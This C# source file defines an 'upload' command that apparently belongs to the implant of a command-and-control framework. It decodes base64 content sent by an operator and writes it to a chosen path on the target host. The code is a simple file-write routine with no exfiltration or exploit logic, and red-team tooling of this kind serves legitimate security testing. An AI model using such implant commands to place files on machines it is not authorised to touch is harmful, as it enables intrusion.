using Engineer.Commands;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class Upload : EngineerCommand
    {
        public override string Name => "upload";

        public override string Execute(EngineerTask task)
        {
            try
            {
                task.Arguments.TryGetValue("/content", out string contentb64);
                task.Arguments.TryGetValue("/dest", out string destination);

                if (string.IsNullOrWhiteSpace(contentb64))
                {
                    return "error: " + "Missing file content";
                }
                if (string.IsNullOrWhiteSpace(destination))
                {
                    destination = Environment.CurrentDirectory;
                }
                var contentbytes = Convert.FromBase64String(contentb64);
                File.WriteAllBytes(destination, contentbytes);
                return "file uploaded at " + destination;
            }
            catch (Exception ex)
            {
                return "error: " + ex.Message;
            }
        }
    }
}
